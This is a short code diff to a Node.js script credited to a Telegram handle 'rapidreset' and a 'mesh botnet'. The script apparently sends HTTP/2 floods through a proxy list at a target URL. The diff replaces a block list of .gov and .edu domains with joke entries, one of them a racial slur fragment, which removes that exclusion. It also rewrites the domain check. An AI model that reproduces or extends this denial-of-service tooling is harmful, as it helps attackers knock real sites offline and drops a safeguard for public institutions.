@@ -1,4 +1,5 @@
 // made by @rapidreset aka mitigations for mesh botnet
+//updated
 const net = require('net');
 const tls = require('tls');
 const HPACK = require('hpack');
@@ -42,7 +43,7 @@ let custom_header = 262144;
 let custom_update = 15663105;
 let timer = 0;
 
-const blockedDomain = [".gov", ".edu"];
+const blockedDomain = [".ass", ".niga"];
 
 const timestamp = Date.now();
 const timestampString = timestamp.toString().substring(0, 10);
@@ -115,8 +116,8 @@ let hcookie = '';
 const url = new URL(target)
 const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
 
-if (url.hostname.endsWith(blockedDomain)) {
-    console.log(`Domain ${blockedDomain} blocked, if this mistake pm to tg @rapidreset`);
+if (blockedDomain.some(domain => url.hostname.endsWith(domain))) {
+    console.log(`Blocked domain detected, if this is a mistake pm to tg @rapidreset`);
     process.exit(1);
 }
 
